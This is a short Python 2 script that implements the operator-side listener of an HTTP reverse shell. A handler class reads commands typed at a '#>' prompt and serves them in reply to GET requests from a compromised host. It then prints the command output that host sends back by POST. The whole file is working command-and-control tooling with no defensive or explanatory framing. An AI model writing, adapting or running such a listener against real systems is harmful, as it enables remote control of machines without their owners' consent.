import sys
import BaseHTTPServer


class ReverseShellHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(self):
        command = raw_input("#> ")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(command)

    def do_POST(self):

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        postVar = self.rfile.read(length)
        print postVar


def main():
    if len(sys.argv) < 3:
        print '[!] Usage: ', __file__, ' <host> <port>'
        exit(0)

    sys.argv = sys.argv[1:]
    server = BaseHTTPServer.HTTPServer
    httpd = server((sys.argv[0], int(sys.argv[1])), ReverseShellHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.shutdown()
        print '[!] Server is terminated.'


if __name__ == '__main__':
    main()
